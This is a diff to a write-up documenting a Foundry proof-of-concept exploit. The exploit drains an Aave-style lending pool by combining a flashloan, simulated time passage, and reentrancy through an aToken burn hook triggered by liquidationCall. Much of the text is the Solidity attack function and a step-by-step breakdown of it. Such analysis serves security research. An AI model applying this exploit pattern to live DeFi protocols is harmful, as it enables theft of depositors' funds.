@@ -67,7 +67,7 @@ Finally, we establish the initial state of the contract by minting the original 
 ```
 
 
- ### Prepare Phase:
+### Prepare Phase
 
 
 #### Initial Condition - Health Factor Above 1
@@ -165,26 +165,53 @@ This function simulates a flashloan from Uniswap, passing control to the **`atta
     }
 ```
 
+#### Flashloan Attack Logic
 
-- Calculates the flashloan amount and sets it as totalBorrowed.
-- Adjusts the block timestamp and number to simulate the passage of time, causing the health factor to decrease.
-- Initiates a liquidation call on the WETH asset, triggering a reentrancy attack.
-- Withdraws funds from the WETH lending pool.
-- Calculates the flashloan fees and repays the flashloan by transferring WETH to address(1).
+The `attackLogic` function orchestrates a flashloan-based attack on the Aave lending pool, exploiting vulnerabilities in the protocol. Here's a breakdown of its key steps:
+
+1. **Calculate Flashloan Amount:**
+   - Calculate the flashloan amount based on the received parameters (`_amount0` and `_amount1`).
+   - Set the calculated amount as `totalBorrowed`.
+
+2. **Adjust Block Timestamp and Number:**
+   - Manipulate the block timestamp and number to simulate the passage of time, causing a decrease in the health factor.
+   - This adjustment sets the stage for subsequent actions in the attack.
+
+3. **Initiate Liquidation Call:**
+   - Start a liquidation call on the WETH asset within the Aave lending pool.
+   - This step triggers a reentrancy attack by initiating an `ontokentransfer` call on the `.burn` function of the aToken.
+
+4. **Withdraw Funds from WETH Lending Pool:**
+   - Execute a withdrawal from the WETH lending pool, securing control over the borrowed assets.
+
+5. **Calculate Flashloan Repayment:**
+   - Emulate the calculation of flashloan fees for a Uniswap V2 pair for continuity.
+   - Ensure there is enough WETH to repay the flashloan, logging any remaining ETH if applicable.
+
+6. **Repay Flashloan:**
+   - Repay the flashloan by transferring WETH to `address(1)` to simulate a reduction in the flashloan amount.
 
 ```solidity
     function attackLogic(uint256 _amount0, uint256 _amount1, bytes calldata _data) internal {
+        // Calculate the flashloan amount and set it as totalBorrowed
         uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
         totalBorrowed = amountToken;
         console.log("Borrowed: %s WETH from Honey", totalBorrowed);
-        //This will fast forward block number and timestamp to cause hf to be lower due to interest on loan pushing hf below one
+
+        // Adjust the block timestamp and number to simulate the passage of time, causing the health factor to decrease
         vm.warp(block.timestamp + 1 hours);
         vm.roll(block.number + 1);
         console.log("healthfAfterAdjust : %d", getHealthFactor());
-        //This will start the reentrancy with ontokentransfer call on .burn of the atoken
+
+        // Initiate a liquidation call on the WETH asset,
+        // This will start the reentrancy with ontokentransfer call on .burn of the atoken
         lendingPool.liquidationCall(weth, weth, address(this), 2, false);
-        //This will withdraw the funds from weth lending pool
+
+
+        // Withdraw funds from the WETH lending pool
         lendingPool.withdraw(weth, _logTokenBal(aweth), address(this));
+
+
         //Calculation of flashloan fees for uniswap v2 pair,we just emulate it here for continuity purposes
         uint256 amountRepay = ((amountToken * 1000) / 997) + 1;
         uint256 wethbal = WETH.balanceOf(address(this));
@@ -192,8 +219,12 @@ This function simulates a flashloan from Uniswap, passing control to the **`atta
         if (wethbal < totalBorrowed) {
             console.log("Remaining eth is %d", totalBorrowed - wethbal);
         }
+
+        // Ensure there's enough WETH to repay the flashloan
         require(amountRepay < WETH.balanceOf(address(this)), "not enough eth");
-        //For test case we just send it to address(1) to reduce the flashloan amount from us to get final assets
+
+
+    // For the test case, transfer WETH to address(1) to reduce the flashloan amount
         WETH.transfer(address(1), amountRepay);
         console.log("Repay Flashloan for : %s WETH", amountRepay / 1e18);
     }
